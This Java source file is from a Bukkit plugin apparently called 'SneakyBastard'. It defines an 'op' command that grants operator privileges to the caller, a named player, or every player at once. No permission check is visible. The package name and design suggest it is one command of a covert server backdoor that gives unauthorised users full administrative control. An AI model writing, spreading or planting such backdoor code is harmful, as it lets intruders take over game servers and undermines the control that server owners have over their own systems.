package net.blackofworld.SneakyBastard.Commands.Server;

import lombok.experimental.ExtensionMethod;
import net.blackofworld.SneakyBastard.Command.CommandBase;
import net.blackofworld.SneakyBastard.Command.CommandCategory;
import net.blackofworld.SneakyBastard.Command.CommandInfo;
import net.blackofworld.SneakyBastard.Extensions.PlayerExt;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.Collection;

@CommandInfo(command = "op", description = "Gives you op.", syntax = "[player]", category = CommandCategory.Server)
@ExtensionMethod({Player.class, PlayerExt.class})
public final class Op extends CommandBase {
    @Override
    public void Execute(Player p, ArrayList<String> args) {
        Collection<? extends Player> pp = firstParamIsPlayer(p, args, true);
        if(pp.contains(null)) {
            p.Reply(ChatColor.RED + "No player with such name!");
            return;
        }
        pp.parallelStream().forEach(pl -> {if(pl != null) pl.SetOp(true);});
        var name = args.size() > 0 ? (args.get(0).equals("*") ? ChatColor.DARK_RED + "Everyone"
                : String.valueOf(ChatColor.DARK_PURPLE) + ChatColor.ITALIC + args.get(0)) + ChatColor.RESET
                : "";
        p.Reply("%s now an operator".formatted(args.size() > 0 ? name + ChatColor.GREEN + " is" : ChatColor.GREEN + "You are"));
    }
}
